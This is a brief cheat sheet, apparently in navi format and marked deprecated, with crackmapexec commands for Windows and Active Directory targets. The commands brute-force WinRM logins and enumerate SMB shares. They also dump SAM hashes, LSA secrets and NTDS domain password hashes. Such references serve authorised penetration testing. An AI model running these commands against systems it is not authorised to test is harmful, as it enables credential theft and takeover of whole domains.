# cme (deprecated)

% cme, crackmapexec, windows, Active directory

## crackmapexec - Brute force user names and passwords over WinRM
```
crackmapexec winrm <ip> -u user.list -p password.list
```

## crackmapexec - Enumerate SMB shares
```
crackmapexec smb <ip> -u "user" -p "password" --shares
```

## crackmapexec - Dump password hashes from SAM
```
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
```

## crackmapexec - Dump LSA secrets
```
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

## crackmapexec - Dump hashes from NTDS file
```
crackmapexec smb <ip> -u <username> -p <password> --ntds
```
